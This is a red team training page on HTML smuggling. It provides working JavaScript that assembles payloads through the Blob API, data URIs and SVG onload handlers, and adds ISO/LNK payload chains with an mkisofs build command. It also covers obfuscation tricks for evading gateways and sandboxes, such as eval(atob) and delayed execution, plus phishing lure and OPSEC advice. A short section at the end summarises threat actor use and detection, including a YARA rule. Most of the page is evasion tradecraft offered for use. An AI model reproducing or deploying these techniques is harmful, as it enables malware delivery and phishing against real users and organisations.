---
layout: training-page
title: "HTML Smuggling — Red Team Academy"
module: "Evasion"
tags:
  - html-smuggling
  - initial-access
  - payload-delivery
  - blob-api
  - iso-delivery
page_key: "evasion-html-smuggling"
render_with_liquid: false
---

# HTML Smuggling

## Overview

HTML smuggling is a payload delivery technique that assembles a file inside the browser using JavaScript, then triggers an automatic download — bypassing perimeter email gateways and web proxies that scan file attachments. The scanning infrastructure sees only an HTML page; the payload is constructed client-side from encoded data within the JavaScript. The downloaded file lands in the user's Downloads folder as if they clicked a legitimate download link.

MITRE ATT&CK: **T1027.006** (Obfuscated Files or Information: HTML Smuggling), **T1566.001** (Phishing: Spearphishing Attachment).

Notable adopters: Nobelium/APT29 (2021 ISO delivery), Qakbot, BazarLoader, LATRODECTUS, Gozi/URSNIF, Emotet.

## Core Technique — JavaScript Blob API

The Blob API creates in-memory binary objects. Combined with `URL.createObjectURL()` and a programmatically clicked anchor element, the browser treats the object URL as a download link and automatically saves the file — no server round-trip required after the page loads.

```
<!-- HTML smuggling via Blob API — minimal working example -->
<html><body>
<script>
  // Payload encoded as Base64 — assembled client-side
  var b64 = "TVqQAAMAAAA...";  // Base64 of the payload binary

  // Decode Base64 to byte array:
  function b64ToBytes(b64) {
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) { bytes[i] = bin.charCodeAt(i); }
    return bytes;
  }

  // Create a Blob object from the byte array:
  var blob = new Blob([b64ToBytes(b64)], { type: "application/octet-stream" });

  // Create an object URL pointing to the in-memory Blob:
  var url = URL.createObjectURL(blob);

  // Create a hidden anchor element and trigger a click to download:
  var a = document.createElement("a");
  a.href = url;
  a.download = "Invoice_2024.iso";   // filename shown to user
  document.body.appendChild(a);
  a.click();

  // Clean up to avoid memory leaks:
  setTimeout(function() { URL.revokeObjectURL(url); }, 3000);
</script>
</body></html>

# Why this bypasses email gateways:
# - Gateway receives the HTML file and scans it — sees only JavaScript text
# - No recognisable PE/ISO/ZIP header at the attachment level
# - The payload bytes are scattered across a Base64 string (no magic bytes)
# - Assembly happens at render time in the browser, entirely client-side
```

## Anchor Download Attribute — Data URI Technique

A simpler variant embeds the payload directly as a Base64 data URI in the `href` attribute of an anchor with the `download` attribute. This avoids the Blob API but has a size limit (~2MB in some browsers) and leaves the full Base64 string in the HTML source.

```
<!-- Data URI download — simpler but size-limited -->
<html><body>
<script>
  var b64payload = "TVqQAAMAAAA...";  // Base64 payload

  var a = document.createElement("a");
  a.href = "data:application/octet-stream;base64," + b64payload;
  a.download = "setup.exe";
  document.body.appendChild(a);
  a.click();
</script>
</body></html>

# Limitations vs Blob approach:
# - Size: data URIs are limited by browser/OS (~2MB Chrome, ~32MB Firefox)
# - The Base64 string is visible in the HTML source as a contiguous block
# - Some gateways decode data URIs and inspect the content
# - Blob approach is preferred for larger payloads and better evasion
```

## SVG-Based Smuggling

Some email gateways and security tools block HTML attachments but permit SVG files. SVG is XML-based and supports embedded JavaScript via event handlers. An SVG file with an `onload` handler performs the same Blob assembly and download trigger as an HTML page, bypassing controls that specifically target HTML attachments.

```
<!-- SVG smuggling — smuggle payload inside SVG attachment -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="smuggle()">
<script type="text/javascript">
function smuggle() {
  var b64 = "TVqQAAMAAAA...";  // Base64 payload
  var bin = atob(b64);
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) { bytes[i] = bin.charCodeAt(i); }
  var blob = new Blob([bytes], { type: "application/octet-stream" });
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "update.exe";
  document.body.appendChild(a);
  a.click();
}
</script>
<rect width="100" height="100" fill="white"/>
</svg>

# Evasion rationale:
# - SVG is treated as an image format by many gateways (not scanned for scripts)
# - Rendered by the browser as a full document (JavaScript executes)
# - Effective against gateways that only block .html/.htm extensions
```

## ISO / IMG / VHD Container Delivery

After Microsoft disabled Office macros from internet-sourced documents (February 2022), threat actors pivoted to container file formats. ISO, IMG, and VHD files mount directly in Windows 10/11 without third-party software. Files inside a mounted ISO do not inherit the Mark of the Web (MotW) Zone Identifier, bypassing SmartScreen warnings — making them an attractive payload wrapping for HTML-smuggled delivery.

```
# HTML smuggling delivers the ISO; ISO contains the actual payload:
# Typical payload chain:
#   HTML smuggling → downloads ISO
#   User mounts ISO (double-click in Windows 10+)
#   ISO contains LNK file → executes DLL or script
#   DLL/script → Cobalt Strike beacon / C2 stager

# Why ISO bypasses MotW:
# Files extracted from a ZIP carry Zone.Identifier = 3 (Internet Zone)
# Files inside an ISO/VHD do not inherit the mount source's Zone.Identifier
# SmartScreen only prompts for Zone.Identifier = 3 files
# → Executables inside a mounted ISO run without SmartScreen warning (pre-Nov 2022)
# Note: Microsoft patched MotW propagation to ISO in Nov 2022 (KB5019959)
# but many unpatched systems remain

# LNK file inside ISO for execution:
# LNK targets: cmd.exe, powershell.exe, rundll32.exe
# LNK argument example (runs DLL from ISO mount point):
# Target: C:\Windows\System32\rundll32.exe
# Arguments: Z:\update.dll,EntryPoint
# Working dir: Z:\  (ISO mount letter)

# Creating an ISO with mkisofs/genisoimage:
mkisofs -o delivery.iso -J -r -V "Software" /path/to/payload_directory/

# Payload directory contains:
# update.lnk   — LNK pointing to cmd.exe /c rundll32.exe Z:\update.dll,Init
# update.dll   — beacon/stager DLL
# document.pdf — decoy document (optional, shown to user)
```

## Obfuscation Techniques for Gateway Evasion

Email security gateways increasingly detect HTML smuggling by signature — looking for Blob API patterns, Base64 strings, and auto-click patterns. The following techniques break those signatures while preserving runtime functionality.

```
# 1 — String splitting: break detectable function names across concatenation:
var fn = "cre" + "ate" + "ObjectURL";
var url = URL[fn](blob);

var dl = "dow" + "nload";
a.setAttribute(dl, "payload.iso");

# 2 — fromCharCode encoding: represent sensitive strings as char codes:
var atobStr = String.fromCharCode(97,116,111,98);  // "atob"
var decoded = window[atobStr](b64);

# 3 — Reversed strings decoded at runtime:
var rev = "bota".split("").reverse().join("");  // produces "atob"
window[rev](encodedPayload);

# 4 — Chunked payload — split Base64 across multiple variables:
var p1 = "TVqQ";
var p2 = "AAMAAA";
var p3 = "AAEAAA8A...";
var full = p1 + p2 + p3;  // assembled at runtime

# 5 — Array shuffle — store payload as char code array, sort at runtime:
var chars = [84,86,113,81,65,65,77,65,65,65,65,65];  // char codes
var b64 = chars.map(c => String.fromCharCode(c)).join("");

# 6 — Base64 decode chain — encode the entire JS as Base64, eval() it:
eval(atob("ZnVuY3Rpb24gc211Z2dsZSgpIHsg..."));  // outer layer: encoded JS

# 7 — setTimeout delay — defer execution to avoid sandbox analysis timeouts:
setTimeout(function() {
  // smuggling code here
}, 5000);  // 5 second delay — automated sandboxes often give up before this
```

## Lure Design and OPSEC

```
# Effective lure themes (high open rates in red team engagements):
# - Invoice / purchase order (Finance teams)
# - HR policy document / benefits update (all staff)
# - IT security alert — "password expiry" / "MFA enrollment"
# - DocuSign / Adobe Sign document ready
# - Package delivery notification (FedEx, UPS, DHL)
# - OneDrive / SharePoint shared document notification

# HTML page design — show a lure page while download occurs:
# - Display a fake loading spinner or "preparing your document"
# - Include company branding (obtained from target website via OSINT)
# - After download, redirect to a real-looking decoy (Google Drive, OneDrive)
# - Use CSS to hide the anchor element completely

# Payload filename OPSEC:
# - Match the lure theme: Invoice_2024_Q1.iso, Benefits_Update.zip, VPN_Setup.exe
# - Avoid generic names (payload.exe, shell.dll) — SmartScreen tracks reputation
# - Use camelCase or mixed case matching the lure document name

# Delivery OPSEC:
# - Send as .html attachment (not .htm — less commonly blocked)
# - Alternatively send as .svg or rename to a double extension (.pdf.html)
# - Host on a domain-fronted or CDN-hosted URL for link-based delivery
# - Consider using legitimate file hosting (OneDrive, Google Drive, Dropbox)
#   for the HTML page to bypass URL reputation filters
```

## Threat Actor Usage

```
# Nobelium / APT29 (2021):
# - Used HTML smuggling to deliver ENVOY backdoor
# - HTML file contained Base64 ISO, ISO contained LNK + DLL payload
# - Campaign targeted government and diplomatic entities
# - Microsoft report: "HTML smuggling surges: Highly evasive loader technique"

# Qakbot (QBot):
# - Sent HTML attachments via email reply-chain hijacking
# - HTML assembled a ZIP containing a DLL via Blob API
# - DLL loaded Qakbot via regsvr32.exe
# - Detection: Qakbot chains: HTML → ZIP → DLL → regsvr32 → C2

# BazarLoader / Team9:
# - HTML smuggling to deliver ISO containing LNK + BazarLoader DLL
# - LNK executed rundll32.exe [DLL],[Export]
# - C2: Emercoin .bazar domains (hence "Bazar")

# LATRODECTUS (DEV-0661 / IcedID replacement, 2024):
# - HTML smuggling delivering JavaScript dropper
# - JS file executed WScript.Shell to run curl/powershell stager
# - Observed in campaigns targeting financial and healthcare sectors

# Emotet (2023 return):
# - Used OneNote + HTML smuggling hybrid techniques
# - HTML attachments with MOTW bypass via ISO
# - Delivered Cobalt Strike and Quantum ransomware
```

## Detection and Defense

```
# Email gateway — detect HTML smuggling at perimeter:
# - Decode Base64 strings inside HTML attachments and inspect header bytes
# - Flag HTML attachments containing: createObjectURL, Blob constructor, atob() calls
# - YARA rule targeting Blob + auto-download pattern:
#   rule html_smuggling { strings: $b = "Blob" $c = "createObjectURL" $d = "a.click()" condition: all of them }
# - Microsoft Defender for Office 365: Safe Attachments sandbox detonation

# Browser / endpoint:
# - Sysmon Event 11 (FileCreate) in Downloads directory with ISO/IMG/ZIP extension
# - Defender SmartScreen file reputation check on downloaded files
# - MDE alert: "HTML smuggling technique used to drop file" (built-in detection)
# - EDR: alert on process chains: browser → iso mount → rundll32/wscript → network

# Network:
# - Block ms-appinstaller:// URI scheme at proxy level
# - Inspect HTML attachments for script blocks containing blob: or data: URIs
# - Web proxy: flag downloads with MIME mismatch (HTML content delivering .iso)

# Group Policy mitigations:
# - Disable Auto-Play / Auto-Run for removable drives and CDROMs
#   Computer Configuration → Administrative Templates → Windows Components → AutoPlay Policies
# - Block ISO/VHD mounting for standard users via AppLocker or WDAC
# - Enable Attack Surface Reduction rule: Block executable content from email client (BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550)
```
